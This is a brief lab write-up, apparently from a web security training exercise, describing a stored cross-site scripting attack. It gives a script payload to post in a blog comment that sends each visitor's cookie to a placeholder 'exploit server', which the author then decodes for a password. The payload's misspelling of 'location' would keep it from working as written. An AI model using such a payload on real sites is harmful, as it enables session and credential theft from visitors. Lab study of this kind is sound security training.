In this Lab
first go to home page of website and open a post
go to comment section and add this XSS payload

<script>document.loaction='exploit server address'+document.cookie</script>

this will do that when ever a user comes to the website it will create a request to my exploit server and add that user's cookie with the request and this is how i will get the cookie and decode to get the password.
